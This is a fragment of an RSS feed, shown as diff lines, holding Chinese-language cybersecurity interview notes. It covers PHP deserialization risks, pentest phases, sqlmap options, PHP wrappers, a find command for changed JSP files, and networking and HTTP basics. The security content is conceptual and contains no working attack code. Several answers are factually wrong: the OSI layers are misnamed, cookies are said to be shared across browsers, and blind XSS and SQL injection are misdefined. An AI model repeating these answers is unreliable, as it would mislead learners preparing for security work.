+<li>采用<strong>签名</strong>或<strong>加密</strong>来保护序列化数据，防止篡改。</li>
+<li>避免反序列化不信任的来源数据。</li>
+</ul>
+<h4>PHP反系列化中的危险函数有哪些？（深信服）</h4>
+<p>在 PHP 中，反序列化存在严重的安全风险，尤其是使用不受信任的数据时。最常见的危险函数是 unserialize()，它可以被攻击者利用进行对象注入，进而执行任意代码。攻击者通过构造恶意数据，可以触发对象的魔术方法，如 __wakeup()、__destruct() 或 __call()，造成远程代码执行漏洞。措施：</p>
+<p>使用 unserialize() 时，启用 allowed_classes 参数，限制反序列化时允许的类。<br>
+确保反序列化的数据来源可信。<br>
+对会话数据使用加密，并通过 HTTPS 传输，防止 session_decode() 被篡改。<br>
+考虑使用 json_decode() 替代 unserialize()，特别是在处理简单数据时。</p>
+<h4>如何获取远程主机进程？</h4>
+<p>获取远程主机进程的方法通常依赖于远程主机的操作系统和网络配置。在允许的情况下，可以使用远程桌面协议（如RDP、SSH等）登录到远程主机并查看进程；或者使用网络管理工具（如nmap、telnet等）来探测和获取远程主机的相关信息。但请注意，这些方法需要相应的权限和配置支持。</p>
+<h4>逻辑漏洞最核心的漏洞原因？</h4>
+<p>逻辑漏洞最核心的漏洞原因是程序中的逻辑错误或设计缺陷，这些错误或缺陷可能导致程序在处理用户输入、权限验证、数据处理等方面出现不符合预期的行为，从而被攻击者利用来执行恶意操作或获取敏感信息。</p>
+<h4>python常用的数据类型有哪些？</h4>
+<p>Python常用的数据类型包括：整数（int）、浮点数（float）、字符串（str）、布尔值（bool）、列表（list）、元组（tuple）、字典（dict）、集合（set）以及自定义的对象类型等。</p>
+<h4>渗透测试的流程？</h4>
+<p>渗透测试的流程通常包括以下几个阶段：信息收集（收集目标系统的相关信息）、漏洞扫描（使用自动化工具或手动方法检测目标系统的漏洞）、漏洞验证（对扫描到的漏洞进行验证和确认）、权限提升（尝试利用漏洞获取更高的权限）、维持访问（在获取权限后保持对目标系统的访问能力）、数据收集（收集目标系统的敏感数据）以及报告撰写（将测试结果和发现的问题整理成报告并交付给客户）。</p>
+<h4>SQL server中有哪些存储类型？</h4>
+<p>SQL Server中的存储类型主要包括：行存储（Row Store），它是最常见的存储类型，用于存储表数据和索引；列存储（Column Store），它优化了列数据的存储和查询性能，适用于大数据分析场景；以及内存优化存储（Memory-Optimized Storage），它利用服务器的内存资源来提高数据的读写速度和并发处理能力。</p>
+<h4>如何收集API接口？</h4>
+<p>收集API接口的方法包括：使用API文档（如Swagger、Postman等）来查看和测试API接口；通过抓包工具（如Wireshark、Fiddler等）来捕获和分析网络请求和响应中的API接口信息；以及通过搜索引擎或社区论坛等渠道来查找和收集相关的API接口信息。</p>
+<h4>Linux系统命令被禁用，如何绕过？</h4>
+<p>如果Linux系统命令被禁用，可以尝试以下方法绕过限制：使用其他未被禁用的命令或工具来执行所需的操作；或者利用系统的漏洞或特性来绕过限制.</p>
+<h4>sqlmap level3和risk3代表什么意思？</h4>
+<p>level代表测试的深度：分为1-5级，越高测试的内容越多，该等级将user-agent和referer头部纳入检测范围。</p>
+<p>risk代表测试的风险等级，告诉SQLMap：“我愿意承担多大的风险来进行这次测试”。</p>
+<h4>SQLmap的os-shell原理是什么？sqlmap写websell原理?</h4>
+<p>SQLMap的OS-Shell功能是通过利用SQL注入漏洞来获取目标服务器上的系统权限，从而允许攻击者执行操作系统级别的命令。SQLMap首先会对目标网站进行<code>SQL注入漏洞检测</code>​。检测到漏洞就尝试<code>利用该漏洞</code>​向服务器发送恶意的SQL语句<code>提升权限</code>​，攻击者可以通过<code>OS-Shell功能执行操作系统级别的命令</code>​，如查看系统信息、读取文件内容等。</p>
+<h4>php伪协议有哪些？</h4>
+<p>file://  http:// https://  ftp://  ftps:// php://  data://   zip://  rar://  phar://</p>
+<ul>
+<li>访问本地文件系统（如file://）。</li>
+<li>访问网络资源（如http://, https://, ftp://,ftps://）。</li>
+<li>访问输入/输出流（如php://input, php://output）。</li>
+<li>数据流处理（如php://filter, 用于对数据进行筛选和过滤）。</li>
+<li>访问压缩文件（如zip://, zlib://,rar://）。</li>
+<li>其他特殊用途（如phar://, 用于访问PHP归档文件）。</li>
+</ul>
+<h4>在Linux系统中，查找24小时内被修改的JSP文件</h4>
+<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>find . -type f -name "*.jsp" -mmin -1440</span></span>
+<span class="line"><span>find / -type f -name "*.jsp" -mmin -1440</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>.：表示从当前目录开始搜索。 /：从根目录开始搜索</span></span>
+<span class="line"><span>-type f：只查找文件（不包括目录）。</span></span>
+<span class="line"><span>-name "*.jsp"：只查找扩展名为.jsp的文件。</span></span>
+<span class="line"><span>-mmin -1440：查找在过去1440分钟（即24小时）内被修改的文件。</span></span>
+<span class="line"><span>-1440 前面的负号表示“小于”指定的分钟数。</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4>JAVA中间件有哪些漏洞？</h4>
+<p>|中间件名称|漏洞|<br>
+|</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>网络安全面试基础知识点梳理</title>
+      <link>https://min168.top/com/job/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html</link>
+      <guid>https://min168.top/com/job/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86.html</guid>
+      <source url="https://min168.top/rss.xml">网络安全面试基础知识点梳理</source>
+      <description>DDos 攻击 ​分布式拒绝服务​，分布式拒绝服务攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动 DDoS 攻击，从而成倍地提高拒绝服务攻击的威力。 什么是 XSS 攻击 跨站脚本攻击 在网页中嵌入客户端恶意脚本，常用 s 语言，也会用其他脚本语言 属于客户端攻击，受害者是用户，网站管理员也属于用户，攻击者一般也是...</description>
+      <category>面试</category>
+      <pubDate>Sat, 08 Feb 2025 14:18:57 GMT</pubDate>
+      <content:encoded><![CDATA[<h2>DDos 攻击</h2>
+<p>​<code>分布式拒绝服务</code>​，分布式拒绝服务攻击指借助于客户/服务器技术，将<strong>多个计算机联合起来</strong>作为攻击平台，对一个或多个目标发动 DDoS 攻击，从而成倍地提高拒绝服务攻击的威力。</p>
+<h2>什么是 XSS 攻击</h2>
+<p><code>跨站脚本攻击</code> 在网页中嵌入客户<strong>端恶意脚本</strong>，常用 s 语言，也会用其他脚本语言</p>
+<p>属于客户端攻击，受害者是用户，网站管理员也属于用户，攻击者一般也是靠 <code>管理员身份</code> 作为跳板</p>
+<h2>什么是 CSRF 攻击</h2>
+<p>程序在开发的时候，未对相关页面进行 token 和 REFERER 判断，造成攻击者可构造自己的 URL 地址<strong>欺骗目标用户进行点击</strong></p>
+<h2>什么是文件上传漏洞</h2>
+<p>任意文件上传漏洞是指由于程序员在对 <code>用户文件上传部分</code> 的控<strong>制不足或者处理缺陷</strong>，而导致的用户可以越过其本身权限向服务器上上传可执行的 <code>动态脚本文件</code></p>
+<h2>什么是 SQL 注入攻击</h2>
+<p>前端代码未被解析被代入到数据库导致数据库报错</p>
+<h2>重要协议分布图</h2>
+<figure><figcaption>在这里插入图片描述</figcaption></figure>
+<h2>arp 协议的工作原理</h2>
+<p><code>地址解析协议</code>  在任何时候，一台主机有 IP 数据报文发送给另一台主机，它都要知道接收方的逻辑（IP）地址。但是 IP 地址必须 <code>封装成帧</code> 才能通过<strong>物理</strong>网络。这就意味着发送方必须有接收方的 <code>物理（MAC）地址</code>，因此需要完成逻辑地址到物理地址的映射。<strong>而 ARP 协议可以接收来自 IP 协议的逻辑地址，将其映射为相应的物理地址</strong>，然后把物理地址递交给 <code>数据链路层</code>。</p>
+<h2>什么是 RARP?工作原理</h2>
+<p>在计算机网络中，每个设备都有一个 <code>唯一的物理地址（MAC地址）</code>，用于在本地网络上标识设备。然而，要在网络上进行通信，每个设备还需要有一个唯一的 IP 地址。通常，IP 地址是手动配置的，但在某些情况下，可能需要 <code>自动分配IP地址</code>。这时，就需要使用 RARP 协议。</p>
+<p>1、当一个设备 <code>启动</code> 时，它会向网络上发送一个 <code>RARP请求</code>，请求获取自己的 IP 地址。<br>
+2、RARP 服务器收到请求后，会查找设备的 MAC 地址，并将其对应的 <code>IP地址</code> 返回给设备。<br>
+3、<strong>设备收到 IP 地址后，可以开始在网络上进行通信。</strong><br>
+需要注意的是，RARP 协议只适用于	<code>局域网内部</code>，因为它需要在 <code>同一物理网络</code> 上的所有设备之间进行通信。<strong>在较大的网络中，通常会使用 DHCP 协议来自动分配 IP 地址</strong>。</p>
+<h2>DNS 是什么?  DNS 的工作原理</h2>
+<p>DNS <code>域名解析系统</code> 是一种将域名映射到 IP 地址的分布式命名系统。DNS 的主要作用是将用户友好的<strong>域名转换为计算机可以理解的 IP 地址</strong>，以便将用户的请求路由到正确的服务器。</p>
+<p><strong>DNS 的工作原理：</strong></p>
+<p>1、用户在浏览器中输入一个域名，例如 <a href="http://www.example.com" target="_blank" rel="noopener noreferrer">www.example.com</a>。<br>
+2、操作系统向<strong>本地 DNS 服务器</strong>发送一个 DNS 查询请求，询问域名 <a href="http://www.example.com" target="_blank" rel="noopener noreferrer">www.example.com</a> 的 IP 地址。(<code>本地查询</code>)<br>
+3、如果本地 DNS 服务器具有存储在其缓存中的 <a href="http://www.example.com" target="_blank" rel="noopener noreferrer">www.example.com</a> 的 IP 地址，它将返回该 IP 地址。（<code>有则返回</code>）<br>
+4、如果本地 DNS 服务器不知道 <a href="http://www.example.com" target="_blank" rel="noopener noreferrer">www.example.com</a> 的 IP 地址，它将向<strong>根 DNS 服务器</strong>发出查询请求。（<code>没有查根</code>）<br>
+5、根 DNS 服务器将指导本地 DNS <a href="http://xn--rcrpk43h6ywnq7bya602b.com" target="_blank" rel="noopener noreferrer">服务器转到负责.com</a> 域的顶级 DNS 服务器。(<code>根指导查询</code>)<br>
+6、本地 DNS <a href="http://xn--zfr66al5cm2ihnp.com" target="_blank" rel="noopener noreferrer">服务器将向.com</a> 顶级 DNS 服务器发出查询请求，请求 <a href="http://www.example.com" target="_blank" rel="noopener noreferrer">www.example.com</a> 的 IP 地址。（<code>查询顶级</code>）<br>
+7、.com 顶级 DNS 服务器将指导本地 DNS 服务器转到负责 <a href="http://example.com" target="_blank" rel="noopener noreferrer">example.com</a> 的权威 DNS 服务器。（<code>顶级指导查询</code>）<br>
+8、本地 DNS 服务器将向 <a href="http://example.com" target="_blank" rel="noopener noreferrer">example.com</a> 的权威 DNS 服务器发出查询请求，请求 <a href="http://www.example.com" target="_blank" rel="noopener noreferrer">www.example.com</a> 的 IP 地址。（<code>查询权威</code>）<br>
+9、权威 DNS 服务器将返回 <a href="http://www.example.com" target="_blank" rel="noopener noreferrer">www.example.com</a> 的 IP 地址，本地 DNS 服务器将缓存该结果并将其返回给操作系统。（<code>权威发回地址</code>）<br>
+10、操作系统将使用 IP 地址来连接到 <a href="http://www.example.com" target="_blank" rel="noopener noreferrer">www.example.com</a> 的服务器，以获取所需的网页或其他资源。</p>
+<h2>RIP 协议是什么? RIP 的工作原理</h2>
+<p>RIP 是一种 <code>基于  距离向量  的路由协议</code>，用于在局域网或广域网中<strong>交换路由信息</strong>，并计算出 <code>最佳的路由路径</code>。RIP 是一种较为简单的路由协议，常用于<strong>小型网络环境</strong>。</p>
+<p>RIP 协议的工作原理：<br>
+1、RIP 协议将整个网络分成若干个网络段，每个网络段有一个唯一的标识符，称为 <code>网络号</code>。<br>
+2、每个路由器都会 <code>维护</code> 一个路由表，记录着到达不同网络的距离和下一跳路由器的信息。<br>
+3、路由器会 <code>周期性</code> 地向相邻路由器 <code>广播自己的路由表信息</code>，让相邻路由器了解到自己的路由情况。<br>
+4、当一个路由器接收到相邻路由器的路由信息后，会将自己的路由表与之 <code>比较</code>，如果相邻路由器提供了一条更短的路径，那么就更新自己的路由表，并将这条信息<strong>广播给相邻路由器</strong>。<br>
+5、路由器会不断地更新自己的路由表，直到<strong>所有路由信息都已经传播到网络中的每个路由器</strong>，并且网络中的所有路由表都一致。</p>
+<h2>RIP 的缺点</h2>
+<p>1、<code>收敛速度慢</code>：当网络中发生故障或拓扑结构变化时，RIP 协议需要较长的时间才能使整个网络的路由表更新。这是因为 RIP 协议的更新周期较长，而且它使用的是距离向量算法，<strong>无法快速适应网络变化</strong>。</p>
+<p>2、<code>不支持大型网络</code>：RIP 协议只能支持较小规模的网络，当网络规模变大时，RIP 协议会产生<strong>大量</strong>的路由信息，从而消耗大量的带宽和处理能力，导致<strong>网络性能下降</strong>。</p>
+<p>3、<code>不支持VLSM</code>：RIP 协议只能支持固定长度的子网掩码，无法支持 <code>可变长度子网掩码（VLSM）</code>，这限制了 RIP 协议在复杂网络环境中的应用。</p>
+<p>4、<code>安全性差</code>：RIP 协议没有对路由信息进行验证和加密，容易受到欺骗和攻击，从而导致网络安全问题。</p>
+<h2>OSPF 协议? OSPF 的工作原理</h2>
+<p>OSPF 是一种路由协议用于在一个单一自治系统（AS）中实现最短路径优先（Shortest Path First，SPF）算法，以决定数据包的传输路径。</p>
+<p>OSPF 协议的工作原理:</p>
+<p>1、邻居发现：OSPF 协议在邻居发现阶段，通过发送和接收 Hello 消息来确认邻居关系。如果两个路由器之间建立了邻居关系，它们将开始交换路由信息。</p>
+<p>2、链路状态数据库同步：每个 OSPF 路由器将它们的链路状态信息存储在一个本地的 <code>链路状态数据库</code>（Link State Database，LSDB）中。当两个邻居路由器建立邻居关系后，它们将交换各自的链路状态信息，并将其存储在本地的 LSDB 中。此时，每个路由器都会尝试同步它们的 LSDB。</p>
+<p>3、SPF 计算：在每个路由器都有完整的 LSDB 后，它们将使用 SPF 算法来计算最短路径树（Shortest Path Tree），并将其存储在路由表中。最短路径树是指从某个路由器出发到其他所有路由器的最短路径。</p>
+<p>4、路由更新：每个路由器都会定期发送更新消息来通知其它路由器它们的链路状态发生了变化。当一个路由器收到一个更新消息时，它会更新自己的 LSDB，并重新计算最短路径树。</p>
+<p>5、数据传输：当数据包到达一个路由器时，该路由器将使用最短路径树来确定下一个路由器，并将数据包转发到该路由器。</p>
+<h2>TCP 与 UDP 区别总结?</h2>
+<p>1、连接：TCP 是面向 <code>连接</code> 的协议，而 UDP 是 <code>无连接</code> 的协议。这意味着 TCP 在发送数据之前需要建立连接，而 UDP 则不需要。<br>
+2、可靠性：TCP 提供 <code>可靠</code> 的数据传输，因为它使用确认和重传机制来确保数据传输的正确性。而 UDP 没有这个机制，因此 <code>可能会丢失数据包</code>。<br>
+3、速度：<code>UDP比TCP更快</code>，因为它没有建立连接和确认机制，数据可以更快地传输。<br>
+4、带宽：TCP 具有自适应拥塞控制，可以动态调整传输速率以适应网络状况，从而最大化利用可用带宽。而 UDP 则没有这个功能。<br>
+5、适用范围：TCP 适用于需要可靠传输和有序交付的应用程序，例如电子邮件、文件传输和 Web 浏览器。而 UDP 适用于需要快速传输和实时性的应用程序，例如视频流、游戏和音频通话。</p>
+<h2>什么是三次握手四次挥手?</h2>
+<ul>
+<li>三次握手指的是在 TCP 建立连接时，客户端和服务器之间需要进行 <code>三次数据交换</code> 的过程。</li>
+</ul>
+<p>1、客户端向服务器发送一个 <code>SYN</code> 数据包，表示请求建立连接。<br>
+2、服务器收到 SYN 请求，向客户端发送一个 <code>SYN+ACK</code> 数据包，表示确认请求并同意建立连接。<br>
+3、客户端收到服务器的 SYN+ACK 请求，向服务器发送一个 <code>ACK</code> 数据包，表示确认连接已建立。</p>
+<ul>
+<li>四次挥手指的是在 TCP <code>关闭连接</code> 时，客户端和服务器之间需要进行四次数据交换的过程。</li>
+</ul>
+<p>1、客户端向服务器发送一个 <code>FIN</code> 数据包，表示请求关闭连接。<br>
+2、<strong>服务器</strong>收到 FIN 请求，向客户端发送一个 <code>ACK</code> 数据包，表示<strong>确认收到请求</strong>。<br>
+3、<strong>服务器</strong>向客户端发送一个 <code>FIN</code> 数据包，表示服务器也请求关闭连接。<br>
+4、客户端收到服务器的 FIN 请求，向服务器发送一个 <code>ACK</code> 数据包，表示确认收到请求，连接正式关闭。</p>
+<h2>TCP 为什么要三次握手?</h2>
+<p>主要是为了保证连接的 <code>可靠性</code>​。在建立连接的过程中，需要确保双方的收发能力正常，否则连接建立后无法正常通信。通过三次握手，可以<strong>确保客户端和服务器之间的信息传递正常</strong>，并且防止网络中的延迟数据包误认为是有效的连接请求。</p>
+<h2>GET 和 POST 的区别</h2>
+<p>1、GET 请求用于 <code>获取资源</code>，通常<strong>不会改变服务器上的数据</strong>。GET 请求通过 <code>URL传递数据</code>，数据会附加在 <strong>URL 的末尾</strong>，形成查询字符串。查询字符串以问号 <code>?</code> 开头，参数之间用 <code>&amp;</code> 符号连接，由于数据以 <code>明文</code> 形式传递，因此不适合传输敏感数据。此外，URL 的长度有限制，不同浏览器对 URL 长度的限制也不同。</p>
+<p>2、POST 请求用于 <code>提交数据</code>，通常会<strong>改变服务器上的数据</strong>。POST 请求通过请求正文传递数据，数据不会附加在 URL 上。因为数据被包含在 <code>请求正文中</code>，所以 POST 请求不会有 URL 长度的限制。POST 请求适合用于传输大量数据或敏感数据。GET 请求适合用于请求数据，而 POST 请求适合用于提交数据。</p>
+<h2>Cookies 和 session 区别</h2>
+<p>Cookies 和 Session 的主要区别在于：Cookies 是在 <code>客户端存储数据的技术</code>，而 Session 是在 <code>服务器端存储数据</code> 的技术。Cookies 可以存储<strong>简单</strong>的信息，而 Session 可以存储<strong>任意类型</strong>的数据。此外，Cookies 可以在<strong>多个浏览器</strong>之间共享，而 Session 只能在同一浏览器之间共享。</p>
+<h2>session 的工作原理?</h2>
+<p>1、当用户访问一个需要进行 <code>身份验证的页面</code> 时，服务器会创建一个唯一的 <code>Session ID</code>，并将该 ID 存储在一个称为 Session 对象的数据结构中。<br>
+2、服务器会将 Session ID 发送到客户端的浏览器，通常是通过在 HTTP 响应头中设置一个名为"<code>Set-Cookie</code>"的标头来实现。<br>
+3、当客户端的浏览器接收到服务器发送的 Session ID 时，它会将该 ID 存储在一个称为 Cookie 的数据结构中，以便在后续的请求中将该 ID 发送回服务器。<br>
+4、当用户进行其他请求时，浏览器会自动将包含 Session ID 的 Cookie 发送回服务器。服务器会根据 Session ID 找到对应的 Session 对象，并读取或存储与该 Session 对象关联的用户数据。<br>
+5、当用户关闭浏览器或者 Session 超时时，Session 对象和 Session 数据将被从服务器内存中删除，以释放服务器资源。</p>
+<h2>一次完整的 HTTP 请求过程</h2>
+<p>1、DNS 解析：当浏览器发起一个 URL 请求时，首先需要将 URL 中的域名转换成对应的 IP 地址，这个过程叫做 DNS 解析。浏览器会先检查缓存中是否有该域名的 IP 地址，如果没有则向本地 DNS 服务器发起请求。</p>
+<p>2、建立 TCP 连接：一旦浏览器得到目标服务器的 IP 地址，就需要建立一个 TCP 连接。TCP 连接是一个可靠的连接，通过三次握手来建立连接。</p>
+<p>3、发起 HTTP 请求：TCP 连接建立后，浏览器会向服务器发送 HTTP 请求。HTTP 请求包括请求方法（GET、POST、PUT、DELETE 等）、URL、HTTP 版本号、请求头等信息。</p>
+<p>4、服务器响应：服务器接收到请求后，会根据请求内容进行处理，并向浏览器返回 HTTP 响应。HTTP 响应包括响应状态码、响应头、响应正文等信息。</p>
+<p>5、接收响应内容：浏览器接收到服务器返回的 HTTP 响应后，会根据响应头中的 Content-Type 字段来判断响应正文的类型，然后将响应正文解析成对应的格式，并进行渲染。</p>
+<p>6、关闭 TCP 连接：当响应内容传输完毕后，TCP 连接会被关闭，释放资源。</p>
+<h2>HTTPS 和 HTTP 的区别</h2>
+<p>HTTP 是 <code>超文本传输协议</code>，它是一种用于传输数据的基本协议，但它不提供任何数据加密或身份验证功能。这意味着 HTTP 传输的数据可以被窃听或篡改，因此不适合传输敏感数据，如信用卡号码、密码等。</p>
+<p>而 HTTPS 是基于 HTTP 的安全协议，通过在 HTTP 之上添加 <code>SSL/TLS</code> 加密来保证数据的安全性。HTTPS 通过使用 <code>数字证书</code> 对 Web 服务器进行身份验证，并使用 <code>公钥加密算法</code> 来加密数据传输，以确保数据在传输过程中不被窃听或篡改。这使得 HTTPS 非常适合传输敏感数据，如信用卡号码、密码等。</p>
+<blockquote>
+<p>20、OSI 的七层模型都有哪些?</p>
+</blockquote>
+<figure><figcaption>在这里插入图片描述</figcaption></figure>
+<h2>http 长连接和短连接的区别</h2>
+<p>HTTP 短连接是指客户端向服务器发送一次请求后，服务器返回响应后<strong>立即关闭连接</strong>。这种方式的优点是可以<strong>节省服务器资源</strong>，但每次请求都需要建立新的连接，可能会增加请求的延迟，降低性能。</p>
+<p>HTTP 长连接是指客户端和服务器之间建立一次连接后，在此次连接上进行多次请求和响应。这种方式的优点是可以减少建立连接的开销，提高性能，但会<strong>增加服务器资源的占用</strong>。</p>
+<p>需要注意的是，HTTP 长连接并不是一直保持开放的连接，而是在一定时间内保持连接状态。在超过一定时间后，如果没有新的请求和响应，连接会自动关闭，以释放服务器资源。</p>
+<h2>TCP 如何保证可靠传输?</h2>
+<p>1、序列号和确认应答机制：每个 TCP 报文段都有一个 <code>唯一的序列号</code>，用来标识报文段在数据流中的位置。TCP 接收方收到报文后，会发送一个 <code>确认应答</code>，告诉发送方哪些数据已经接收到。如果发送方没有收到确认应答，会重发该报文段。</p>
+<p>2、滑动窗口机制：TCP 使用滑动窗口机制来控制发送方发送的数据量。接收方会告诉发送方自己的接收 <code>窗口大小</code>，发送方就会根据接收方的窗口大小来发送数据。如果发送方发送的数据量超过接收方的窗口大小，接收方就会 <code>拒绝接收多余</code> 的数据。</p>
+<p>3、超时重传机制：如果发送方<strong>没有收到确认应答</strong>，就会认为该数据丢失了，会重新发送该数据。发送方会根据计时器来确定重传的时间间隔和次数，以保证数据的可靠传输。</p>
+<p>4、拥塞控制机制：TCP 使用拥塞控制机制来控制网络中的流量，以防止网络拥塞。如果网络中出现拥塞，TCP 会降低发送方的发送速率，以减少网络拥塞的程度。</p>
+<h2>常见的状态码有哪些?</h2>
+<p>1xx（信息性状态码）：表示请求已经被接收，继续处理。</p>
+<p>100 Continue: 请求已经接受，客户端应该继续请求。</p>
+<p>101 Switching Protocols: 请求的协议已经改变。</p>
+<p>2xx（成功状态码）：表示请求已经被成功接收、理解、接受。</p>
+<p>200 OK: 请求已成功处理。</p>
+<p>201 Created: 请求已经成功处理，并且创建了资源。</p>
+<p>202 Accepted: 服务器已经接受请求，但是未处理完成。</p>
+<p>204 No Content: 请求已经成功处理，但是没有响应内容。</p>
+<p>3xx（重定向状态码）：表示需要客户端进行进一步操作以完成请求。</p>
+<p>301 Moved Permanently: 请求的资源已经被永久移动到新的位置。</p>
+<p>302 Found: 请求的资源已经被临时移动到新的位置。</p>
+<p>304 Not Modified: 请求的资源没有被修改，客户端可以使用本地缓存。</p>
+<p>4xx（客户端错误状态码）：表示客户端提交的请求有错误。</p>
+<p>400 Bad Request: 请求无效，服务器无法解析请求。</p>
+<p>401 Unauthorized: 请求需要身份验证。</p>
+<p>403 Forbidden: 请求被服务器拒绝。</p>
+<p>404 Not Found: 请求的资源不存在。</p>
+<p>5xx（服务器错误状态码）：表示服务器在处理请求时出现错误。</p>
+<p>500 Internal Server Error: 服务器内部错误。</p>
+<p>503 Service Unavailable: 服务器当前无法处理请求，一般是服务器过载或正在维护。</p>
+<h2>什么是 SSL? https/ssl 是如何保证数据传输的安全</h2>
+<p>SSL 用于在网络上进行 <code>安全通信</code>​。SSL 的主要目的是为了保护在网络上传输的数据的安全性、完整性和机密性。</p>
+<p>HTTPS 是在 HTTP 协议上加入 SSL/TLS 协议的安全协议，可以确保网站与客户端之间的通信是加密的、安全的。</p>
+<h2>HTTPS 是如何保证数据传输的安全呢？</h2>
+<p>1、加密：SSL/TLS 协议使用 <code>对称加密和非对称加密结合</code>​ 的方式，保证数据在传输过程中的安全性。<strong>​<code>对称加密</code>​</strong>​ <strong>用于</strong> <strong>​<code>加密数据</code>​</strong>​ <strong>，<strong>​</strong>​<code>非对称加密</code>​</strong>​ <strong>用于在客户端和服务器之间</strong> <strong>​<code>交换密钥</code>​</strong>​。</p>
+<p>2、鉴别：证书机构颁发的证书用于验证服务器的身份和公钥，防止中间人攻击和欺骗。</p>
+<p>3、完整性：SSL/TLS 协议使用 <code>消息摘要算法</code>​，通过对消息进行哈希运算生成消息摘要，以确保在传输过程中的数据完整性。</p>
+<h2>如何保证公钥不被篡改?</h2>
+<p>1、数字签名：在公钥发布之前，将公钥使用私钥进行数字签名，这样在验证公钥时，只需验证数字签名即可确定公钥的真实性。</p>
+<p>2、公钥基础设施（PKI）： PKI 是一组 <code>技术和协议</code>，用于管理数字证书和公钥，确保公钥的安全性和可靠性。</p>
+<p>3、公钥哈希：将公钥进行哈希处理，然后将哈希值公布出来，这样可以确保公钥未被篡改。</p>
+<p>4、物理保护：将公钥存储在物理设备中，如智能卡或 USB 密钥，可以保护公钥免受篡改。</p>
+<h2>php 爆绝对路径方法?</h2>
+<p>1、dirname(<strong>FILE</strong>) 或 dirname(<strong>FILE</strong>)：这两个函数都可以获取当前脚本的目录名，也就是当前脚本所在的文件夹的路径。然后可以使用 realpath() 函数来将目录名转换为绝对路径。例如：$absPath = realpath(dirname(<strong>FILE</strong>));</p>
+<p>2、$_SERVER['DOCUMENT_ROOT']：这个变量包含当前脚本所在的文档根目录的绝对路径。可以使用这个变量和$_SERVER['PHP_SELF'] 变量来获取当前脚本的绝对路径。例如：$absPath =$_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF'];</p>
+<p>需要注意的是，使用 $_SERVER['PHP_SELF'] 变量时需要注意安全性，因为它可能会受到恶意用户的攻击。建议使用$_SERVER['SCRIPT_NAME'] 或 $_SERVER['SCRIPT_FILENAME'] 变量来代替$_SERVER['PHP_SELF']。</p>
+<h2>你常用的渗透工具有哪些，最常用的是哪个?</h2>
+<p>1、Burp Suite</p>
+<p>2、SQLmap</p>
+<p>3、Nmap</p>
+<p>4、kali linux</p>
+<p>5、Hydra</p>
+<p>6、瑞士军刀</p>
+<h2>xss 盲打到内网服务器的利用</h2>
+<p>盲打 XSS 是指攻击者没有先进行漏洞探测，而是直接尝试利用 <code>已知</code> 的 XSS 漏洞进行攻击。在某些情况下，攻击者可能会通过盲打 XSS 攻击内网服务器。</p>
+<p>攻击者可能会利用 XSS 漏洞注入恶意代码，使得在受害者的浏览器中执行该代码后，向攻击者控制的服务器发送请求，以获取内网服务器的 <code>敏感信息</code>。这种攻击方式通常需要攻击者事先准备一个恶意服务器，以接收发送到该服务器的请求并获取敏感信息。</p>
+<h2>鱼叉式攻击和水坑攻击</h2>
+<p>1、鱼叉攻击是指黑客通过伪装成一个可信来源的方式来欺骗特定目标，以获取敏感信息或者进行其他恶意活动的攻击方式。这种攻击通常是通过电子邮件或社交媒体等通信方式实施的，黑客会针对某个特定的人或组织，通过伪造信任的方式来引导受害者点击链接或者下载附件等，从而让受害者泄露出机密信息或者安装恶意软件。</p>
+<p>2、是指黑客通过攻击受害者经常访问的网站，以获取敏感信息或者进行其他恶意活动的攻击方式。这种攻击通常是通过对目标网站进行攻击，使得访问该网站的用户受到感染或者被重定向到恶意网站，从而让黑客获得用户的敏感信息或者控制用户的计算机。</p>
+<p>简讲：鱼叉式攻击是一种针对个人或组织的攻击，而水坑攻击则是一种针对广泛用户的攻击。</p>
+<h2>什么是虚拟机逃逸?</h2>
+<p>指攻击者利用虚拟化软件或操作系统中的漏洞，从虚拟机（VM）环境中获得对物理主机的控制权。攻击者可以通过虚拟机逃逸攻击，绕过安全措施，获取对整个物理主机的访问权限，并访问所有存储在其中的敏感数据。</p>
+<h2>中间人攻击?</h2>
+<p>指攻击者在通信过程中 <code>窃取</code> 双方通信的数据，并尝试篡改或者重放数据的一种攻击方式。攻击者通常会在用户和服务器之间插入一个恶意的中间节点，这个节点会伪装成正常的通信节点，使得双方都认为他们在与对方直接通信。</p>
+<h2>TCP 三次握手过程?</h2>
+<p>1.客户端向服务器发送连接请求（SYN）包，其中包含客户端的初始化序列号（ISN）。</p>
+<p>2.服务器接收到请求后，回复一个带有确认序列号（ACK）的 SYN 包，其中包含服务器的初始化序列号（ISN）。</p>
+<p>3.客户端再次发送一个带有确认序列号（ACK）的包，确保连接已经建立。</p>
+<h2>七层模型?</h2>
+<p>物理层  --&gt; 数据参数层 --&gt; 数据链路层 --&gt; 网络层 --&gt; 传输层 --&gt; 表示层 - &gt; 应用层</p>
+<h2>对于云安全的理解</h2>
+<p>云安全是指在 <code>云计算环境下</code> 保护云端和云端相关资源的安全性。云安全包括保护云计算基础设施的安全、云服务提供商和云用户之间的安全关系、以及云中存储和处理的数据的安全性。</p>
+<p>云安全需要采取一系列的措施来保障云计算环境的安全性，这些措施包括但不限于：</p>
+<p>1、认证和访问控制：确保只有授权的用户能够访问云服务和云中存储的数据。</p>
+<p>2、数据保护：采用数据加密、备份、灾备等措施来保护云中存储的数据的安全性。</p>
+<p>3、网络安全：保障网络的可靠性和安全性，防止网络攻击。</p>
+<p>4、合规性：确保云服务的合规性，满足相关的法律法规和标准要求。</p>
